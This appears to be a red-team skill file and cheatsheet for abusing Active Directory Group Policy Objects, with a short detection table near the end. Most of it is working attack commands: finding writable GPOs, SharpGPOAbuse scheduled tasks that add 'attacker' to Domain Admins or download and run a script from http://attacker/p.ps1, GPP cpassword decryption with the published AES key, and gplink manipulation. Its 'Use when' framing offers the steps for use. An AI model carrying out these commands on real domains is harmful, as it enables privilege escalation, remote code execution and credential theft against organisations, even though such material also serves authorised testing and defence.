---
name: offensive-gpo-abuse
description: "Group Policy Object abuse — finding GPOs you can edit (WriteProperty / WriteDacl on gpcfilesyspath / GPO link), SharpGPOAbuse for adding scheduled tasks, immediate tasks, computer-side / user-side script injection, GPO link manipulation, and GPP cpassword decryption from older GPP-stored credentials. Use when a low-priv user has unintended GPO write access or you find legacy GPP cpassword artifacts."
---

# GPO Abuse

GPOs push policies (often privileged ones — registry settings, scheduled tasks, scripts) to OUs. With write access on the GPO, you push your own policy.

## Find Editable GPOs

```powershell
# PowerView — find GPOs you can edit
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
  ?{ $_.SecurityIdentifier -eq (Get-DomainUser current).objectsid -and \
     $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|GenericAll' }
```

```bash
# nxc / impacket-style enumeration via LDAP
nxc ldap dc -u user -p pass --module gpp-password
nxc ldap dc -u user -p pass --module gpp-autologin
```

BloodHound surfaces "GenericAll on GPO" → "GPO linked to OU" → "Computer/User in OU" paths directly.

## SharpGPOAbuse

```powershell
# Add immediate-trigger scheduled task to GPO
SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "WindowsUpdate" \
  --Author "NT AUTHORITY\System" \
  --Command "cmd.exe" \
  --Arguments "/c net group 'Domain Admins' attacker /add /domain" \
  --GPOName "Workstation Policy"

# Trigger gpupdate /force on target machine, or wait ~90 minutes for default refresh
```

```powershell
# Add user-side scheduled task (runs in user context on logon)
SharpGPOAbuse.exe --AddUserTask --GPOName "User Policy" \
  --TaskName "Browser Update" --Author "Admin" \
  --Command "powershell.exe" \
  --Arguments "-c IEX (New-Object Net.WebClient).DownloadString('http://attacker/p.ps1')"
```

## GPP cpassword (Legacy)

Older GPP (Group Policy Preferences) feature stored credentials encrypted with a published key. The encrypted blob lives in `\\dc\SYSVOL\<domain>\Policies\<GPO>\<Machine|User>\Preferences\<type>\*.xml`:

```bash
# Find cpassword in SYSVOL
nxc smb dc -u user -p pass --module gpp-password
# Or directly
findstr /S /I cpassword \\dc\SYSVOL\corp.local\policies\*.xml
```

### Decrypt

```python
# AES key (Microsoft published)
key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'

# Decrypt with gpp-decrypt or pyMSEDeval / various tools
gpp-decrypt 'encrypted_string'
```

Microsoft removed cpassword in MS14-025 (2014) but never cleaned existing artifacts. Old SYSVOL still contains them in many environments.

## GPO Link Manipulation

```powershell
# Find OUs you can link GPOs to
Get-DomainOU -Properties name,gplink | ?{ ... }

# Link a GPO with WriteProperty access
Set-DomainObject -Identity 'OU=Workstations,DC=corp,DC=local' \
  -Set @{gplink='[LDAP://CN={GPO-GUID},CN=Policies,CN=System,DC=corp,DC=local;0]'}
```

If you can edit `gplink` on an OU containing computers/users, you push any GPO you control to those targets.

## SYSVOL Permissions

```bash
# Find writable paths in SYSVOL (low-priv-user ACL gaps)
smbclient.py corp/user@dc -no-pass
# Check ACLs on \\dc\SYSVOL\corp.local\Policies\<GPO>\
```

A misconfigured ACL on SYSVOL can let any user modify GPO files directly — even without LDAP `WriteProperty`.

## Detection

| Signal | Defender View |
|---|---|
| GPO modification | DC event 5136 (object modify), GPMC audit |
| Scheduled task creation via GPO | EDR on target after gpupdate |
| SYSVOL file change | File integrity monitor on DC SYSVOL share |
| BloodHound "GenericAll on GPO" finding | If org runs BH-as-defender |

## Engagement Cheatsheet

```bash
# 1. Find editable GPOs
nxc ldap dc -u user -p pass --module gpos-with-acl-gap-or-similar
# (Or BloodHound paths)

# 2. Check for legacy cpassword
nxc smb dc -u user -p pass --module gpp-password

# 3. SharpGPOAbuse to add task
SharpGPOAbuse.exe --AddComputerTask ...

# 4. Wait for gpupdate or trigger remotely
nxc smb 10.0.0.0/24 -u admin -p pass -X "gpupdate /force"

# 5. Document: GPO, target OU, payload, observed effect
```

## Key References

- SharpGPOAbuse: github.com/FSecureLABS/SharpGPOAbuse
- gpp-decrypt
- BloodHound GPO edges
- "Group Policy Preferences" Microsoft KB
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/gpo-abuse.md
